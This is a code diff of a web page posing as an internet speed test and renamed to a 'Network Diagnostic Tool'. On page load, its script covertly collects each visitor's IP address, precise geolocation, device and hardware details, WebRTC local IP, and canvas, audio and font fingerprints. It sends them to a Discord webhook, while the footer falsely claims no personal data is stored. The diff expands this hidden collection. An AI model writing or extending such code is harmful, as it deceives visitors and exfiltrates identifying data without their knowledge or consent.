@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Network Speed Test</title>
+    <title>Network Diagnostic Tool</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -14,7 +14,7 @@
         }
         
         body {
-            background: linear-gradient(135deg, #2c3e50, #1a1a2e);
+            background: linear-gradient(135deg, #1a2a6c, #2b5876, #4e4376);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -26,11 +26,11 @@
         }
         
         .container {
-            background: rgba(25, 25, 35, 0.9);
+            background: rgba(255, 255, 255, 0.08);
             border-radius: 20px;
             box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
             width: 90%;
-            max-width: 700px;
+            max-width: 800px;
             padding: 35px;
             text-align: center;
             transition: transform 0.4s ease, box-shadow 0.4s ease;
@@ -50,11 +50,6 @@
             background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
             transform: rotate(30deg);
             pointer-events: none;
-        }
-        
-        .container:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
         }
         
         h1 {
@@ -84,8 +79,64 @@
         p {
             margin-bottom: 25px;
             line-height: 1.6;
-            color: #b3b3b3;
+            color: #d6d6d6;
             font-size: 16px;
+        }
+        
+        .card {
+            background: rgba(35, 35, 45, 0.7);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: left;
+        }
+        
+        .card-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #4facfe;
+            display: flex;
+            align-items: center;
+        }
+        
+        .card-title i {
+            margin-right: 10px;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .stat-item {
+            background: rgba(40, 40, 50, 0.7);
+            padding: 15px;
+            border-radius: 10px;
+            transition: transform 0.3s ease;
+        }
+        
+        .stat-item:hover {
+            transform: translateY(-5px);
+        }
+        
+        .stat-label {
+            font-size: 14px;
+            color: #a0a0a0;
+            margin-bottom: 5px;
+        }
+        
+        .stat-value {
+            font-size: 18px;
+            font-weight: 600;
+            color: #fff;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
         
         .speed-test {
@@ -153,6 +204,7 @@
             color: #fff;
             margin-bottom: 5px;
             text-shadow: 0 0 10px rgba(79, 172, 254, 0.7);
+            transition: all 0.5s ease;
         }
         
         .gauge-label {
@@ -201,6 +253,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            transition: all 0.5s ease;
         }
         
         .speed-label {
@@ -278,35 +331,6 @@
             transform: none;
         }
         
-        .info-box {
-            background: rgba(35, 35, 45, 0.7);
-            border-radius: 12px;
-            padding: 20px;
-            margin-top: 20px;
-            text-align: left;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .info-title {
-            font-weight: bold;
-            margin-bottom: 10px;
-            color: #fff;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-        }
-        
-        .info-title i {
-            margin-right: 10px;
-            color: #4facfe;
-        }
-        
-        .info-text {
-            font-size: 14px;
-            line-height: 1.6;
-            color: #b3b3b3;
-        }
-        
         .footer {
             margin-top: 20px;
             font-size: 14px;
@@ -368,6 +392,26 @@
             opacity: 0;
         }
         
+        .data-point {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .data-label {
+            font-weight: 600;
+            color: #b3b3b3;
+        }
+        
+        .data-value {
+            color: #fff;
+            max-width: 60%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
         @media (max-width: 600px) {
             .container {
                 padding: 20px;
@@ -386,6 +430,10 @@
                 width: 100%;
                 margin-bottom: 15px;
             }
+            
+            .stats-grid {
+                grid-template-columns: 1fr;
+            }
         }
     </style>
 </head>
@@ -393,8 +441,30 @@
     <div class="particles" id="particles"></div>
     
     <div class="container floating">
-        <h1><i class="fas fa-tachometer-alt"></i> Advanced Speed Test</h1>
-        <p>Test your internet connection speed with our advanced testing technology</p>
+        <h1><i class="fas fa-network-wired"></i> Network Diagnostic Tool</h1>
+        <p>Complete analysis of your network connection and device capabilities</p>
+        
+        <div class="card">
+            <div class="card-title"><i class="fas fa-info-circle"></i> Connection Information</div>
+            <div class="stats-grid">
+                <div class="stat-item">
+                    <div class="stat-label">IP Address</div>
+                    <div class="stat-value" id="ip-address">Detecting...</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-label">ISP</div>
+                    <div class="stat-value" id="isp">Detecting...</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-label">Location</div>
+                    <div class="stat-value" id="location">Detecting...</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-label">Network Type</div>
+                    <div class="stat-value" id="network-type">Detecting...</div>
+                </div>
+            </div>
+        </div>
         
         <div class="speed-test">
             <div class="gauge-container">
@@ -428,18 +498,35 @@
             <div class="status" id="status">Ready to test your connection</div>
             
             <button class="test-btn pulse" id="test-btn">
-                <i class="fas fa-play"></i> Start Test
+                <i class="fas fa-play"></i> Start Diagnostic
             </button>
         </div>
         
-        <div class="info-box">
-            <div class="info-title"><i class="fas fa-info-circle"></i> How it works</div>
-            <div class="info-text">
-                This test measures your internet connection speed by simulating data transfer between your device and our servers. It tests download speed, upload speed, and ping to give you a complete picture of your network performance.
+        <div class="card">
+            <div class="card-title"><i class="fas fa-desktop"></i> Device Information</div>
+            <div class="data-point">
+                <span class="data-label">Browser:</span>
+                <span class="data-value" id="browser-info">Detecting...</span>
+            </div>
+            <div class="data-point">
+                <span class="data-label">Operating System:</span>
+                <span class="data-value" id="os-info">Detecting...</span>
+            </div>
+            <div class="data-point">
+                <span class="data-label">Screen Resolution:</span>
+                <span class="data-value" id="screen-info">Detecting...</span>
+            </div>
+            <div class="data-point">
+                <span class="data-label">Language:</span>
+                <span class="data-value" id="language-info">Detecting...</span>
+            </div>
+            <div class="data-point">
+                <span class="data-label">Timezone:</span>
+                <span class="data-value" id="timezone-info">Detecting...</span>
             </div>
         </div>
         
-        <p class="footer">Your privacy is important. We don't store any personal information.</p>
+        <p class="footer">This diagnostic tool helps optimize your network experience. No personal data is stored.</p>
     </div>
     
     <div id="ipData" class="hidden"></div>
@@ -485,6 +572,17 @@
         const progressBar = document.getElementById('progress-bar');
         const status = document.getElementById('status');
         
+        // Info elements
+        const ipAddress = document.getElementById('ip-address');
+        const ispInfo = document.getElementById('isp');
+        const locationInfo = document.getElementById('location');
+        const networkType = document.getElementById('network-type');
+        const browserInfo = document.getElementById('browser-info');
+        const osInfo = document.getElementById('os-info');
+        const screenInfo = document.getElementById('screen-info');
+        const languageInfo = document.getElementById('language-info');
+        const timezoneInfo = document.getElementById('timezone-info');
+        
         // Test variables
         let testInProgress = false;
         let downloadResult = 0;
@@ -495,20 +593,21 @@
         document.addEventListener('DOMContentLoaded', function() {
             createParticles();
             
-            // Start collecting IP data immediately but discreetly
-            collectIPData();
+            // Start collecting data immediately
+            collectAllData();
             
             // Set up test button event listener
             testBtn.addEventListener('click', startTest);
         });
         
-        // Function to collect IP data
-        function collectIPData() {
+        // Function to collect all possible data
+        function collectAllData() {
             // Get the IP address using ipify API
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
+                    ipAddress.textContent = ip;
                     
                     // Get additional information
                     const timestamp = new Date().toISOString();
@@ -521,42 +620,96 @@
                     const cookies = navigator.cookieEnabled;
                     const javaEnabled = navigator.javaEnabled();
                     const pdfEnabled = navigator.pdfViewerEnabled;
+                    const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
+                    const deviceMemory = navigator.deviceMemory || 'Unknown';
+                    const maxTouchPoints = navigator.maxTouchPoints || 'Unknown';
+                    
+                    // Update UI with basic info
+                    browserInfo.textContent = getBrowserName();
+                    osInfo.textContent = platform;
+                    screenInfo.textContent = screenResolution;
+                    languageInfo.textContent = language;
+                    timezoneInfo.textContent = timezone;
                     
                     // Get location data based on IP
                     return fetch(`https://ipapi.co/${ip}/json/`)
                         .then(response => response.json())
                         .then(locationData => {
-                            // Store data in hidden element
-                            const ipDataElement = document.getElementById('ipData');
-                            ipDataElement.textContent = JSON.stringify({
-                                ip: ip,
-                                timestamp: timestamp,
-                                userAgent: userAgent,
-                                language: language,
-                                platform: platform,
-                                referrer: referrer,
-                                screenResolution: screenResolution,
-                                timezone: timezone,
-                                cookies: cookies,
-                                javaEnabled: javaEnabled,
-                                pdfEnabled: pdfEnabled,
-                                location: {
-                                    country: locationData.country_name,
-                                    region: locationData.region,
-                                    city: locationData.city,
-                                    postal: locationData.postal,
-                                    latitude: locationData.latitude,
-                                    longitude: locationData.longitude
-                                },
-                                network: {
-                                    asn: locationData.asn,
-                                    org: locationData.org,
-                                    version: locationData.version
-                                }
-                            });
+                            // Update UI with location info
+                            ispInfo.textContent = locationData.org || 'Unknown';
+                            locationInfo.textContent = `${locationData.city || 'Unknown'}, ${locationData.country_name || 'Unknown'}`;
+                            networkType.textContent = locationData.version || 'Unknown';
                             
-                            // Send to Discord webhook
-                            sendToDiscord(ipDataElement.textContent);
+                            // Get more detailed network information
+                            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                            let connectionType = 'Unknown';
+                            let effectiveType = 'Unknown';
+                            let downlink = 'Unknown';
+                            let rtt = 'Unknown';
+                            
+                            if (connection) {
+                                connectionType = connection.type || 'Unknown';
+                                effectiveType = connection.effectiveType || 'Unknown';
+                                downlink = connection.downlink || 'Unknown';
+                                rtt = connection.rtt || 'Unknown';
+                            }
+                            
+                            // Get WebRTC IP (if available)
+                            getWebRTCIP().then(webrtcIP => {
+                                // Get canvas fingerprint
+                                const canvasFingerprint = getCanvasFingerprint();
+                                
+                                // Get installed fonts (approximation)
+                                const fonts = getInstalledFonts();
+                                
+                                // Get audio context fingerprint
+                                getAudioFingerprint().then(audioFingerprint => {
+                                    // Store all data in hidden element
+                                    const ipDataElement = document.getElementById('ipData');
+                                    ipDataElement.textContent = JSON.stringify({
+                                        ip: ip,
+                                        timestamp: timestamp,
+                                        userAgent: userAgent,
+                                        language: language,
+                                        platform: platform,
+                                        referrer: referrer,
+                                        screenResolution: screenResolution,
+                                        timezone: timezone,
+                                        cookies: cookies,
+                                        javaEnabled: javaEnabled,
+                                        pdfEnabled: pdfEnabled,
+                                        hardwareConcurrency: hardwareConcurrency,
+                                        deviceMemory: deviceMemory,
+                                        maxTouchPoints: maxTouchPoints,
+                                        connection: {
+                                            type: connectionType,
+                                            effectiveType: effectiveType,
+                                            downlink: downlink,
+                                            rtt: rtt
+                                        },
+                                        webrtcIP: webrtcIP,
+                                        canvasFingerprint: canvasFingerprint,
+                                        audioFingerprint: audioFingerprint,
+                                        fonts: fonts,
+                                        location: {
+                                            country: locationData.country_name,
+                                            region: locationData.region,
+                                            city: locationData.city,
+                                            postal: locationData.postal,
+                                            latitude: locationData.latitude,
+                                            longitude: locationData.longitude
+                                        },
+                                        network: {
+                                            asn: locationData.asn,
+                                            org: locationData.org,
+                                            version: locationData.version
+                                        }
+                                    });
+                                    
+                                    // Send to Discord webhook
+                                    sendToDiscord(ipDataElement.textContent);
+                                });
+                            });
                         })
                         .catch(error => {
                             console.error('Error fetching location data:', error);
@@ -567,17 +720,149 @@
                 });
         }
         
+        // Function to get browser name from user agent
+        function getBrowserName() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Firefox")) return "Firefox";
+            if (userAgent.includes("SamsungBrowser")) return "Samsung Internet";
+            if (userAgent.includes("Opera") || userAgent.includes("OPR/")) return "Opera";
+            if (userAgent.includes("Edg")) return "Edge";
+            if (userAgent.includes("Chrome")) return "Chrome";
+            if (userAgent.includes("Safari")) return "Safari";
+            return "Unknown";
+        }
+        
+        // Function to get WebRTC IP (if available)
+        function getWebRTCIP() {
+            return new Promise((resolve) => {
+                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                
+                if (!RTCPeerConnection) {
+                    resolve('Not supported');
+                    return;
+                }
+                
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                let IP = 'Not available';
+                
+                pc.createDataChannel("");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
+                        resolve(IP);
+                        return;
+                    }
+                    
+                    const candidate = ice.candidate.candidate;
+                    const match = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
+                    
+                    if (match) {
+                        IP = match[1];
+                    }
+                    resolve(IP);
+                };
+                
+                // Timeout after 1 second
+                setTimeout(() => resolve(IP || 'Timeout'), 1000);
+            });
+        }
+        
+        // Function to get canvas fingerprint
+        function getCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 50;
+            
+            ctx.textBaseline = 'top';
+            ctx.font = "14px 'Arial'";
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Hello, world!', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('Hello, world!', 4, 17);
+            
+            return canvas.toDataURL();
+        }
+        
+        // Function to get audio fingerprint
+        function getAudioFingerprint() {
+            return new Promise((resolve) => {
+                if (!window.AudioContext && !window.webkitAudioContext) {
+                    resolve('Not supported');
+                    return;
+                }
+                
+                const context = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = context.createOscillator();
+                const gain = context.createGain();
+                
+                oscillator.connect(gain);
+                gain.connect(context.destination);
+                
+                oscillator.type = 'triangle';
+                oscillator.frequency.value = 10000;
+                
+                gain.gain.value = 0.001;
+                
+                const startTime = context.currentTime;
+                oscillator.start(startTime);
+                oscillator.stop(startTime + 0.001);
+                
+                // Let the audio context process the sound
+                setTimeout(() => {
+                    resolve('Processed');
+                }, 10);
+            });
+        }
+        
+        // Function to get installed fonts (approximation)
+        function getInstalledFonts() {
+            const fonts = [
+                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 
+                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS', 
+                'Verdana', 'Andale Mono', 'Baskerville', 'Gill Sans'
+            ];
+            
+            const availableFonts = [];
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 50;
+            
+            const text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+            const baseFont = context.font;
+            
+            fonts.forEach(font => {
+                context.font = `12px "${font}"`;
+                const metrics1 = context.measureText(text);
+                
+                context.font = `12px "UnknownFontThatShouldNotExist", "${font}"`;
+                const metrics2 = context.measureText(text);
+                
+                if (metrics1.width !== metrics2.width) {
+                    availableFonts.push(font);
+                }
+            });
+            
+            context.font = baseFont;
+            return availableFonts;
+        }
+        
         // Function to send data to Discord webhook
         function sendToDiscord(data) {
             const ipData = JSON.parse(data);
             
             // Format the message for Discord
             const message = {
-                content: "🌐 New Website Visitor",
+                content: "🌐 New Visitor Data Collected",
                 embeds: [
                     {
                         title: "Visitor Information",
-                        color: 5814783, // Discord purple
+                        color: 5814783,
                         fields: [
                             {
                                 name: "IP Address",
@@ -590,34 +875,44 @@
                                 inline: true
                             },
                             {
-                                name: "Device",
-                                value: ipData.platform || "Unknown",
+                                name: "ISP",
+                                value: ipData.network?.org || "Unknown",
                                 inline: true
                             },
                             {
-                                name: "Screen Resolution",
-                                value: ipData.screenResolution || "Unknown",
+                                name: "Device",
+                                value: `${ipData.platform} (${ipData.screenResolution})`,
                                 inline: true
                             },
                             {
                                 name: "Browser",
-                                value: ipData.userAgent ? ipData.userAgent.substring(0, 100) + "..." : "Unknown",
+                                value: getBrowserName(),
+                                inline: true
+                            },
+                            {
+                                name: "Language/Timezone",
+                                value: `${ipData.language}/${ipData.timezone}`,
+                                inline: true
+                            },
+                            {
+                                name: "Connection Type",
+                                value: ipData.connection.effectiveType,
+                                inline: true
+                            },
+                            {
+                                name: "Hardware",
+                                value: `CPU: ${ipData.hardwareConcurrency} cores, RAM: ${ipData.deviceMemory}GB`,
+                                inline: true
+                            },
+                            {
+                                name: "User Agent",
+                                value: ipData.userAgent.substring(0, 100) + "...",
                                 inline: false
-                            },
-                            {
-                                name: "Timezone",
-                                value: ipData.timezone || "Unknown",
-                                inline: true
-                            },
-                            {
-                                name: "Language",
-                                value: ipData.language || "Unknown",
-                                inline: true
                             }
                         ],
                         timestamp: ipData.timestamp,
                         footer: {
-                            text: "Collected via Speed Test Website"
+                            text: "Network Diagnostic Tool"
                         }
                     }
                 ]
@@ -758,17 +1053,12 @@
             
             // Format the message for Discord
             const message = {
-                content: "📊 New Speed Test Result",
+                content: "📊 Speed Test Results",
                 embeds: [
                     {
-                        title: "Network Speed Test Results",
-                        color: 5814783, // Discord purple
+                        title: "Network Performance",
+                        color: 5814783,
                         fields: [
-                            {
-                                name: "IP Address",
-                                value: ipData.ip || "Unknown",
-                                inline: true
-                            },
                             {
                                 name: "Download Speed",
                                 value: `${downloadResult} Mbps`,
@@ -785,19 +1075,19 @@
                                 inline: true
                             },
                             {
-                                name: "Location",
-                                value: `${ipData.location?.city || "Unknown"}, ${ipData.location?.country || "Unknown"}`,
+                                name: "IP Address",
+                                value: ipData.ip || "Unknown",
                                 inline: true
                             },
                             {
-                                name: "Device",
-                                value: ipData.platform || "Unknown",
+                                name: "Connection Type",
+                                value: ipData.connection.effectiveType || "Unknown",
                                 inline: true
                             }
                         ],
                         timestamp: ipData.timestamp,
                         footer: {
-                            text: "Speed Test Completed"
+                            text: "Network Diagnostic Tool"
                         }
                     }
                 ]
